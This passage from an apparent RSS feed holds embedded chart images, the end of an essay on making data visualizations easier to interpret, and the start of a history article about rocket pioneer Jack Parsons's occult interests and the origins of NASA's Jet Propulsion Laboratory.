        <image id="_Image5" width="238px" height="62px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO4AAAA+CAYAAAAs0CcNAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAEj0lEQVR4nO3dXW7bRhQF4EOZVuwodmJTrpMGRYsCbVEURVF0A13MvHE986ZldEcBmqTyJKjt2q1/xD7w0uafZEoiORzyfMAFacqW5sEHHJEzQ09p8y2AfQALAJFs8/urXlv2e7ezMLgDEdXOB/A7gK+aeHOlTQTgVupmg22yfw3gCsD1LAxum2grkUv8ht/fAzCWmtTxhkqbO0iIZfvk/iwM/qvjs4m6oungNsEHcChVidJmAeACwPmKupyFwaL21hI1wMXgbmIE4KXUMpHS5hLlof4M4IxnbuqKoQS3Cg/AgdTbsl+QYJ8BmMv2DHGgz9tqJBHA4K7rhdQ36YNKmxukgpyqT7MwuG+5jTQADG49xgC+lEqLlDafkA3zHOx205YY3GZ5AAKpH9IvpLrd6a73fBYGF203ktzD4NqzrNv9D4A/0zULg8vWW0edxuB2zwTAd1IAAKXNBYphvrLTPOoCBtcNB4i72g/dbaXN3yiG+V87zaO2MbjuSu5L/5gcUNp8RjbM73kRrJ8Y3H45kvopOaC0MciG+cMsDG7sNI/qwuD2X3JV++fkgNJmjmyYP3LyhlsY3GE6kfpFfo6UNn+hGGYOHukoBpeA+H7zqdSvcmyhtPmIbJjnDHM3MLi0zAjAG6nf5Ni90uYDgPfIhpmzqlrmLxb33mi0Y7sd5IYdxBMw0pMw7uQ7c35YJ8dpN8gfjXYi240gp/l4PDOnRXJ7qmycNu83b4ldZWqKB+BY6vv0CzKsMz9O+wzA+SwMeCKpgMElGyZSX+eO38p953zX27DbncXgUpfsAngtlbFidZKHGlK4GVxyRTKbKj/n+YHS5grFQF+hZCFB16+EM7jUJ8+lCmfsPFm1pMoqoaVLB9v+Ls7g0lAlywa/2uSPZZngddYJr/qAgSoPI7hmcIk240vtW/jsdyMLH0pEW2JwiRzE4BI5iMElchCDS+QgBpfIQQwukYMYXCIHMbhEDvIB/AFgD3GIPdmOKvy86rVdqXGFLUdvEa3Js90ApY2H5aHel0oGj5ftP2u/1URWvbMe3G0pbUYoD/QE8aM7DlM1sdRMojq5H9x1KG12UAxzvg6sNZCommEFtwoJ9zHiBcOnudq12DSiBINblXwXP0QxzCdgF5zaxeDWQWmzh/JAH6EDFwCpdxjcJqW63ekwJ1veBqONRNGCwbVBroRPES98ltRrxE8KIHoKg9sVcnY+QTbMp+DoNipicLtMwnyKbJi/AL83Dx2D6xqljY+4W50O8xQM85AwuH2gtBmjGObAaqOoSQxuXyltnqEY5mOrjaK6MLhDIveb3yAb5o0WBCerGNyhU9o8RzHMh1YbRU9hcKlIafMC2TC/BYd1dgmDS9UobQ5QnHhxgvgJetQuBpe2IxfB8mGeIr4Qxv+vZjC41AwZPHKEbJiTGltsWh8wuNS+Jd3uKbiIQVUMLnVHqtv9CstXJ+H/LINLLpFZVROUh/olHsPd94kZDC71j5y5n1odNL/v0vxoBpcIAJQ2u3gM8h6yywRXWR+8bNtUvhhcoqbITK4kwOs+VGDVa9f/A97Fr1H4MhUiAAAAAElFTkSuQmCC"></image>
        <image id="_Image6" width="239px" height="30px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO8AAAAeCAYAAADEvkkFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACcElEQVR4nO3bXW7aQBiF4dfglBIgqeSldBHdiO9Yj+/YUTfQ2y7AUhIIBRJMLzxuB2wr/JnxxOeRPuEYKfmU5GQmM+MAEfknTtIeMDDVB3oX1jU+R1X9DJv6JojcSpykAfCF/6GzrwdH3Lff8yUTv3xpVD65OEn7wMjU2NQ9H4etuO4chVcaY0bEIox2KMcV94aO2vSWwisni5P0nvoQ2vdGrnrsAoVX9pjp6wPwaOqbdV2Ufm9aQD+EjomTdEg5jHZIx+66k1MovJ+I2eaYUD1aFtXJxZ3PZpdtA4XXI3GSDqgeLYuaAIGzBuVmgl5/p/C2hFmZnVA/nX0k3xYRATRtbpyZytqrs4crs0VgH8hPzogcReE9gxklh2i7RBzqfHjjJA2pPzZXd8BghP63FMe8DK+Zih5zTvWY+5qqipfCOEnvgK808+TDNZ6yuKMcOC//6IhcUwh8B364bkTEsTdgDWzM69rc2wLZjeqUr7XWCCY+y4AV+4E7rLr37Pub2TTKbt38pRReaYMMeAUW1mtRS/KAloI4m0ZbJ922hMIrTToMYt3Hf2bTaOeqSV8pvHKqDHgBnoG5qcNQLoClAtkshVcOrciDeVhP5nWhULaDwtstO/KRsghiqWbTaO2uPTlFuMu2QdDru+5DrmNDeaR8sa7nPq6qSrUw6PU1BfLHnPrp7PNsGq0c9iY3pmlze7xTP519Ih81O701IvsU3mbtyPcpP9wumU2jpasmxU8K73mWVG+PlA4YaGVWmtLl8B5zbG5NHkg7lK9a9JE28C2875x/ftWuN42I4ruQfAXzN5c/5dDUkxRbPD48LtKUv+t6N2dNwxFeAAAAAElFTkSuQmCC"></image>
        <image id="_Image7" width="239px" height="41px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAO8AAAApCAYAAADdwX4QAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAC2klEQVR4nO2d227bMAxAaTtthw3YHxfgN++pyMXbg6mGURTPTnyR5XMAIopjNEaRE9G6MJWqfojID+n4K1debT8MVfXnAsATHCx+LvmmqipyK3Qr/cK3qeBLAPbMYcX3rixERJpn/oB9CSTFTsRFVduXrhggI9aUdypqi/9isl9ctPFzVb3McpUAE1OCvGNppKend4J7sc8h6L0hF/Yo7xCC4G/xCybvOQ56bFga5B1PLSLvFt/Y4FlK6vPiVwi7oPr8/PzVNM3vtS+kcO6klk5sRsvhaQ5N89RAL4wjTMndYKm2F/qkqqeFrw02CmnzuoR7649wwKXfRxE5SSc0qTfcgbz5UUk3UPY9WGZCn3wgNCDvNqgkGiSzUe9YaEa8dwTybpdaunTbp9yx0EfmpcsFecsiJfRF7ntohC4A5C2fMCgWdo4hdCFUqtpIJ3Hlj0/QDhsPatdOBeTBWe6FZh46Y1aXR1VTQtdRu47adXQc5sELfRQWlmTF5j/4Jn+f4I17ZEXK65yiQOiV2Ly8Y7HbBC9z6jmMI14pxg6sBdidvENQ1VquSxoP0gmdXOIIvbADa0aQdwSWonuRffC/HE5yB5Z01U5IwQfCB24i3Kh9HIOqfMA3pOADQd6ZSaTgPhWHcVDCyIG8K2Ep+EGumxBuNiPA08RihwKEd1VIt56iI29GREK/2yODZPORKiscH0uVIc6i/jjyZo4JHffOCJ0PvT8wIFfZ/flx+9HrfeeckXeDuPvo0Du/CffQe+MP8haCCR330AhdLshbMia0753fhKmrUkDevWHz0XEPjdDbA3lBRFVTU1Z8NvIGeSENQmcP8sJwVNVPVbFSbF2QF17DLSxJBcxE27bIC/NhqTc7sOYBeWF52IE1CcgL+WDz0mEqK9xPU8IoDfLCdqCE0Q3IC2Xheu9UpdFUbBXkhX0TVR9NlRXuC3/O0iAvwBQ8qD/+6AcGpmh//QPYWllTHlRvWgAAAABJRU5ErkJggg=="></image>
        <image id="_Image8" width="240px" height="80px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABQCAYAAAAnSfh8AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAFhElEQVR4nO2dS27jOhBFr/x3nGkDvRztKtNampfzgJ52J7ZsS2/AYqwociwn+pCsewBCdiB02DFPSlX8JBORDMAvOKpaa75vfq3L/SWAUkRKEEJ6Z6HX+ZDfREQA4AIntL+WbV8Tkar9XyGENFncv6U35tqWX92k0bpN9AuAs4icB+4nIdEwpsBdmWlr7ZtG6HOzUWxikRAFvkcGF8U/RPIbYp9E5DJ6DwkZiRgFvkUXsU8AChE5jd89QvonJYFvURd7C7xLXdTaicUzEiMWBG4jA7DWBgCVRuUCwBEUmkRCpvPAv6fuSIDUI3RBoUmIWI3AXVhpAwBohD4CODCHJqFAgbvj8+hnrWwf4GQupu0WsUz28vKSbbdbPkJ/nxJXmY9Td4bYgjlwv5TQx2wAR+bNZGj4CN0vM7ipqi1cZdvLfKDMZAgo8HBkADbaKhF5A/DGnJn0CQUehwzAE4AnXbP9Ciczt1mSHzHP8zwD8Dx1Rwwxg1tA8pzn+TLP82q/33O9NvkWjMDTsgGw0UjsozJ3VZHOsAodHgWczCx8kbswAoeHXwFWisg/AK/MlcktmAOHi99wscvzfJ7n+Xm/3zMikw9Q4PDx2yF3WvQqWfQiHgocFwsAT3mer7V6zYKXcXwOfIH7TQ+9Zu23k0BYAVjppoq/cNVrPl4b5KaoWp3299Sl7vp+Djfn6a+zr74f+RF+GuofC162GFUoEfEi16VuE302Zr8SogLwBicyH68NEGRE1Ojvj5ZtNsrdjSOAv1x7nTZBCvwVIjLHZ6mXiPD/MhInuIj8NnVHSP8kM+hbxP50xKxxLgD8whAWvBIhGYHb0EfxVa0xUrs82Re8OJ8cOaYGswq9xEepTf0MGviCFw/pixTLgxcAICJLuCWLloUu4ApePNMrMiwO1i9Rof1JGtY2e5zh8mQuDIkECvwFIrLAVWZLBbES14IXF4YEDAXuiFa5vcyrO7enAheGBA4F/ga6oqwus4Wf4wFOZC4MCQgLA29QtLK9gTu0zkJkLuBEPkzdEUKBe0Vz5i2czKkv+eROqACgwAMhIhs4mTdT92VguBNqQijwwGi+/AQnc8rTUhVcnvzKPHk8KPCIiMgKTuYN0v7Zn+Gq15yGGpiUB1GwaFTewUaufIDLk1n0GgAKPCFawd7CnUk2n7g7Q8PD6weAAgeCFr12sDMV5f/YGyvYP4ACB4bmyTukX70GXOGrwPVPsDJffhAKHCg6p7yDe8S28jnVZeZe5Q5YGRjRUpuG2iH9gledE64yM2e+AQWOhFrBa4e055PbOOMqMw8fqEGBI0RE1nCVawsFryY+by4AHK0LTYEjRg8f8HmyVepCFwBOlirbFDgBdK+yXxhi/TOt4PLnd6lTFtr6h50Umif7glfqC0Me4QSXR/vrOZUqNwVOFBHxBS9LRwE9QoWG1IhQbAqcOLow5Bnu5E1yH/8Ifm60MsRHcQpsBKMLQ/qmrLVL4/r+eswVZfwgjWFsJ9RUVPgsum9V7Z6q6/tb0Z8CG8XYTqhUaMr9hwITazuhUuI/CkzeMbYTKgUoMPkMC17RQIHJbQzvhIoFCkzuY/Dw+ligwOQxjB1eHzoUmHwf3dboj8kl40OByc/RXNlHZWuHDUwJBSb9olNRW7CCPQYUmAxDrfC1gdtIwbHWPxSYDI/KvMZVZha/+oECk/HR4pePzpT5+1BgMi2aM3uZuaniMSgwCQc9pM9HZ54kch8KTMJE8+ZVo5GPUGASByr0Ek7ktb62Pn4pMImThtC+WRvPFJikg+bQKzixF9pSHuMUmKSNHnq/wEepUxGbAhOb6K6qthaTExSYkDo1sefaZtrqr0OBAhPyCFo8a0rdJvoYi1IoMCFDodssfctqDT29//M/oU4NlA/K/ZQAAAAASUVORK5CYII="></image>
        <image id="_Image9" width="981px" height="126px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA9UAAAB+CAYAAAAqeTKvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAD9ElEQVR4nO3czWrbQBhA0Ukxhfap9cR9gEJpV4FSnDTc6GdGnLOTxtY32uki7JcBAAAAvGvbtpdn55+eBACAMzx5SP3f8Vvn3ju/yvoMezh6j2fsrzqzjc6aZc7xfj6u3gEAwNFCuB19fJcZewYxwJJENQDsYKe3bbMfrzoDAA4jqgEWMuHbtrOC6Or7Em0AwFOiGib21p8h/OWu63cIwSNmAAAwmce2bd/GGF/Cd/2Qf51ZZ8/cY87sf7JxxjoAADC5xxjj+xjj69UbAQAAgNWUN9QAAADAENUAAACQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgEhUAwAAQCSqAQAAIBLVAAAAEIlqAAAAiEQ1AAAARKIaAAAAIlENAAAAkagGAACASFQDAABAJKoBAAAgEtUAAAAQiWoAAACIRDUAAABEohoAAAAiUQ0AAACRqAYAAIBIVAMAAEAkqgEAACAS1QAAABCJagAAAIhENQAAAESiGgAAACJRDQAAAJGoBgAAgOhx9QYAAIBP+z35+lkzjvjujHOumHnmva10T79ENQDAGv59+Pvs8RHXvGKPb527zfq2bVeEGvBBohoAeLVCtB1xzen2KKIA1iGqATjb1cGzQrQdPkO0AcA+RDVwR8sFzg7HU15TuAEAdzdTVK/0Y/TZZt3tnqb+XdMO15h9f2esv/cZ0QYAwDIeY4wfrwceTgEAAODj/gCkWqOVAS8SegAAAABJRU5ErkJggg=="></image>
        <image id="_Image10" width="486px" height="72px" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAeYAAABICAYAAAAj8lblAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAE5klEQVR4nO3dbW/aSBSA0UtId6XV/uj531vi/YCdjidjg8EYv5wjWQ44raKq4ckdGHJKKf0bEaf4o4m+5s5rUz53yt+T324iIlJK5XUA2IXPiPgnIs7v/kKmSClFXCOdH7X77rl213U/DACwhM93fwFPOEV/0n+pgR8G8qh/jZx796WUvpb6ugHYli2H+R1m+WEgi/xYzEfPJniAfRLm9znFE08htHH/MY2350t2rTsuYg6wfsK8bR/tcZc2zL1YRyXgcZ3ILbcDvIEwH0s3pd+c1IuJfDDg3WEaB5iHMDOmm8hv/j9pJ+xLdvRup5QuL/w6AXZDmJlLF/FftYvtBD4Y7rjG2/I5cHjCzJJGl9Hb5fBb8bZkDuyaMLMmp7j+nxz8f1ksmf/Oz5bLgT0QZrZmcMk8m7h/l2fRBrZCmNmTwYm7fY77R7DDEjmwMsLMkXTR/ru80E7UtUn796JfIXB4wgxX1RemZZN2d/wXf57TNmUDs/tsmiZOp8V+FwRs0dDyeB7s70OwgWd8ijI8bCjY3XJ4PmELNnAXS9kwv25ZvPdcdhHsfML2xirAN2GG5QwF+yvqE7ZgwwEJM7zfR0T81R7fimDnE7Y92bBjwgzrNRTsJorpOgQbdkOYYXtOcX3ns967n2XBLidse7FhQ4QZ9mMs2JcoJuywFxtWSZhh/8beqtRebFgZYYZjG9uLXU7Ygg0LEGagZugtSu3FhhcTZmCKW3uxy1eKCzZMJMzAHOzFhpkIM/BK9mLDRMIMvMOtrV35c9mXuG7tsh+bQzillLo4l79m6jTw8ZRrr/h7TwNHeQ3Yny7YP85eMc5e7DZgKaWxaN+K+tTru/13hA3JJ+3eWbTZEkGZSUrpI67/nveca/cBr9O9CO1SO4SbNRHmlWgn/Clxr52Bx3y1RzXcEfEl3izFg/lOZGE/x5+pvHa7O4BpxsJ9sWebuQjzAWURvxXw7j7gtiZ+xvsr+tP4l4BzizBzU/v8eS3g5+ywnA7368U6KgHvDkvox+OBlNm0AT8PHN01YJpub/dgvLv7RHwfhJnFFM+DD4Xb0jk8rltOf+gs7OsgzKxKG++hqfszhBtebUrQe/d5/nwewsymtOH+jH6s89vAezUjx6zX9zrhCzO7UUzbZbC9Lzzs09Sol3+29vG7PjciohFmDiOl1AW6dva9AKzBxYMRRC/a5eE5bWBJwgxj2i1gv0KwgWUIMzyiDXZtwvYCNOAZwgxzEmzgScIMS8i2edUOgI4wwzsJNlAQZlijbE92Ldi+b2G/hBm2JqU0NGH7fobtE2bYi8pe7G6bl+9z2A5hhr3z5imwKcIMR1XZ2tVN2IIN7yPMQJ+92PBWwgzcp7K1q5uwBRvmI8zAc+zFhvk0TSPMwGtU9mLnvwwEqBNmYHnZXuza78aGIxNmYD2yKbsWbJM2RyDMwHZke7JrZ49n7IEwA/vQRrsW7HPYm812CDOwf8USeRfqc3F4PGQNhBkg4vuNVcbC7YVpLEGYAe6VLZcPxduSOc8SZoC5tEvmH9lxLm6X90NJmAHepV0+H4p4edvj9TEIM8AWZC9gG5q+T8XZRL5NwgywV23Ma8Eu7xs7syxhBmBYu9x+b8jzmJ8qB7cJMwDLyab4oXA/en3o2tYIMwD71f4gENGP9NDHU28/em3sc5v/AUtziAX6Vf5OAAAAAElFTkSuQmCC"></image>
        <image id="_Image11" width="733px" height="110px" xlink:href="data:image/png;base64,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"></image>
    </defs>
</svg>
</a>
  </div>
  <figcaption>
    Focusing on "how do I get the reader to see the story I see?"
  
</figcaption></figure>
<p>The product manager's response is effusive:</p>

<blockquote>
<p><em>This is fascinating. One in three signups never install? Wow – what a big opportunity. And this is for the last week, so it could be a result of changes we made a couple weeks ago but never tracked. I am going to share these numbers in our next strategy meeting and see if anyone else has ideas. I think we've been fixated on converting web sessions to signups, but we haven't been considering all the other weak points. Nice that there's a link to the data source. I'm going to pair this with data from our external data vendor. I have so many follow-up questions about where we can go from here!<p>
– the PM</p></em></p>
</blockquote>
<p>Your updated chart got the reader to an "aha!" moment quickly, answered all of their immediate contextual questions, and put them on the path to asking the next set of deeper product questions. All of these were achieved by focusing on the small things that made the data visualization more immediately interpretable.</p>
<p>This is obviously a contrived example. The data visualization does have to be relevant to the audience. In our example, it'd be a problem if the product manager didn't care about the user journey of the product they're working on. If your data visualization isn't showing something meaningful to the reader, it probably won't get them to care. This said, it's not always so straightforward to get someone to understand that a new insight <em>is</em> relevant, especially if the visual story you're telling is novel to them in some way. But then again, that's why we've reframed the challenge to <em>telling the story well</em>, isn't it?</p>
<h3 id="the-two-constraints"><a href="#the-two-constraints">¶</a> The Two Constraints</h3>
<p>The reality is, even if you have the desire to take your data visualization further, there are two things that are likely to get in your way: <strong>limitations with your tools</strong>, and <strong>diminishing returns</strong>.</p>
<h4 id="limitations-with-your-tools"><a href="#limitations-with-your-tools">¶</a> limitations with your tools</h4>
<p>If you’ve used a visualization library before, you’ve probably discovered that there are always limits to what you can do. The lower level you go, the more work it is to get annotations and animations to do what you want.</p>
<p>This said, most libraries support all the basic small things in some way. I'm hesitant to suggest what things to add to your charts, since building intuition around effective visual storytelling is more important than having a checklist. This said, there are some common easy-to-implement small things that always immediately improve the readability and interpretation of your graphic:</p>
<ul>
<li><strong>human-readable labels</strong> – labels are always the easiest thing to add, and often the most impactful. Make sure they're expressed in clear, simple language. Don't …</li></ul></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hamiltonulmer.com/notes/data-viz-small-things/">https://hamiltonulmer.com/notes/data-viz-small-things/</a></em></p>]]>
            </description>
            <link>https://hamiltonulmer.com/notes/data-viz-small-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066475</guid>
            <pubDate>Thu, 12 Nov 2020 04:33:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Occult History Behind NASA’s Jet Propulsion Laboratory]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25066293">thread link</a>) | @jtmarino
<br/>
November 11, 2020 | https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/ | <a href="https://web.archive.org/web/*/https://www.supercluster.com/editorial/the-occult-history-behind-nasas-jet-propulsion-laboratory/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span>Jack Parsons was one of the most influential figures in the history of the American space program. He was also a Marxist, stood accused of espionage, and held a deep fascination with the occult. His interest in the supernatural went far beyond vaudeville magicians and astrology. By 1939, Parsons and his wife Helen Parsons-Smith had fully embraced the teachings of the Ordo Templis Orientis, a central hub for Aleister Crowley’s spiritual and religious philosophy — Thelema.</span></p></div><div><p><span>Aleister Crowley taught that a Thelemite’s central ambition was to achieve a higher state of existence by embracing one’s “True Will,” or one’s ultimate purpose beyond selfishness or ego. In pursuit of that goal, many aspects of Parsons’s life blurred the boundaries between science and mysticism. As a Thelemite, he performed ritual magic, including banishing impure elements with pentagrams, invocating the power of the “Holy Guardian Angel,” and offering daily adorations to the sun. </span></p></div><div><p><span>All while pushing the limits in the nascent field of rocket science.</span></p></div><div><p><span>Jack Parsons was born Marvel Whiteside Parsons on October 2nd, 1914, to Ruth Virginia Whiteside and Marvel H. Parsons in Los Angeles, California. For the first two years of their marriage, the Parsons were swept into a dark whirlwind romance in the heart of the City of Angels. By the 1900s Los Angeles had become </span><a href="https://www.nytimes.com/2005/03/06/books/chapters/strange-angel.html" rel="noopener noreferrer" target="_blank">a hotbed of new-age spiritualism and occult fascination</a><span>, in which the Parsons were active participants. It was turn-of-the-century America’s Williamsburg, perfect for the upper-middle-class pseudo-bohemian who wanted a crystal ball that matched their silverware set.</span></p></div><div><p><span>Jack’s father was perhaps too taken by the city’s attractive social loosening. He made his rapid exodus from California after Ruth exposed him as an adulterer, who had frequented a local prostitute in the months leading up to and following their son’s birth. After the newlyweds' bitter split, Ruth excised the elder Parsons from their son’s life both physically and legally, insisting her son be referred to as “John Whiteside Parsons” on all legal documents. The rechristened Parsons was brought up by his mother and his maternal grandparents. Using their </span><a href="https://www.nytimes.com/2005/03/06/books/chapters/strange-angel.html" rel="noopener noreferrer" target="_blank">wealth from the manufacturing industry</a><span>, the Whitesides moved Ruth and John, or “Jack”, to Orange Grove Avenue, Pasadena’s “Millionaire’s Mile.” </span></p></div><div><p><span>Spending a majority of his childhood in solitude, Parsons soon found a personal hideaway in science fiction. Enraptured by Jules Verne and the pulp magazine </span><em>Amazing Stories</em><span>, Parsons developed an interest in rocketry at a young age.</span></p></div><div><p><span>By age 12, the future father of modern rocketry was </span><a href="http://www.spacesafetymagazine.com/aerospace-engineering/rocketry/jack-parsons-occult-roots-jpl/" rel="noopener noreferrer" target="_blank">conducting backyard experiments</a><span> with his classmate Edward Forman. The two boys designed gunpowder-based rockets with aluminum foil, cherry bomb fireworks, and glue. Around the same time, Parsons was performing bedtime incantations to invoke the Devil - another practice he’d learned from reading </span><em>Amazing </em><span>comics. In an effort to “straighten out” her wayward son, who was so distracted that he started flunking out of grade school, Parsons’s mother sent him to the Brown Military Academy for Boys in San Diego—a sprawling, 100-acre private boys’ school known as “The West Point of the West.”</span></p></div><div><p><span>It didn’t work. Parsons was expelled for blowing up the toilets.</span></p></div><div><p><span>With a renewed confidence that only vandalizing private property can give, Parsons resumed his rocket engineering experiments at home. After a brief stint back in school and a year at Stanford University, Parsons was forced to take up working weekends, holidays, and eventually full-time employment at the Hercules Powder Company after his family experienced financial losses during the Great Depression. He was no older than 19. Directly dealing with chemicals and munitions, Parsons not only learned more about the properties of gunpowder and its potential as a rocket propellant, but he also occasionally stole materials from work for his and Forman’s experiments. Parsons and Forman continued these after-hour experiments well into their mid-to-late 20s.</span></p></div><div><p><span>By 1933, Parsons had constructed his first solid-fuel rocket engine. He was only 29 years old. His boyhood interest in magic and the supernatural only grew stronger as he delved further into rocket science. That same year, Parsons turned his Orange Avenue estate into a bohemian haven, renting rooms out to artists, occultists, and dropouts galore. In 1934, Jack Parsons and Edward Forman met PhD candidate Frank Malina at a public CalTech lecture. The trio soon managed to impress Malina’s supervising professor Dr. Theodore van Kármán enough that he allowed the young engineers to conduct experiments at the university’s Guggenheim Aeronautical Laboratory—GALCIT. </span></p></div><div><p><span>With access to CalTech’s resources and equipment, the trio formed the GALCIT Rocket Research Group. Thus, the blueprint for NASA’s Jet Propulsion Lab was born. What resulted was a bachelor pad for rocket pioneers.</span></p></div><div><p><span>Between rocket experiments, the trio would wax poetic about their shared socialist values, smoke marijuana, and drink to excess. Parsons and Malina even wrote a sci-fi screenplay and pitched it around to several Hollywood production companies. Making it big on the silver screen was starting to seem like a more viable option than rocket engineering for the GALCIT Group. Most of their experiments increasingly ended in violent explosions, that terrified neighboring CalTech academics so much the three researchers were </span><a href="https://www.kcet.org/shows/blue-sky-metropolis/the-bad-boys-of-space-exploration-and-the-origins-of-the-jet-propulsion" rel="noopener noreferrer" target="_blank">nicknamed the “Suicide Squad.”</a><span> </span></p></div><div><p><span>Parsons came to a crossroads during his later years with GALCIT. On the one hand, he integrated himself into the academic fold. While working with GALCIT by day, Parsons studied chemistry at USC by night. On the other hand, the wild rocket scientist was falling further into his obsession with Thelema. By 1939 he was enraptured with Aleister Crowley’s revival of what began as a sixteenth-century philosophy. Thelema was by this time a sprawling esoteric movement, incorporating ancient 